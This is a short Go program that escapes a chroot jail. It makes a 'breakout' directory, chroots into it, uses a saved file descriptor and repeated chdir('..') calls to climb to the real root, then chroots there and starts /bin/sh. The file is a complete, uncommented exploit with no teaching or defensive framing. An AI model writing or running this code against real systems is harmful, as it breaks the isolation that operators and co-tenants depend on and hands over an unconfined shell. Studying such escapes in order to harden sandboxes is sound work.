package main

import (
	"os"
	"syscall"
)

func main() {
	os.Mkdir("breakout", 0755)
	fd, _ := syscall.Open(".", syscall.O_RDONLY, 0)

	syscall.Chroot("breakout")
	syscall.Fchdir(fd)

	for i := 0; i < 100; i++ {
		syscall.Chdir("..")
	}

	syscall.Chroot(".")
	syscall.Exec("/bin/sh", []string{"/bin/sh"}, os.Environ())
}
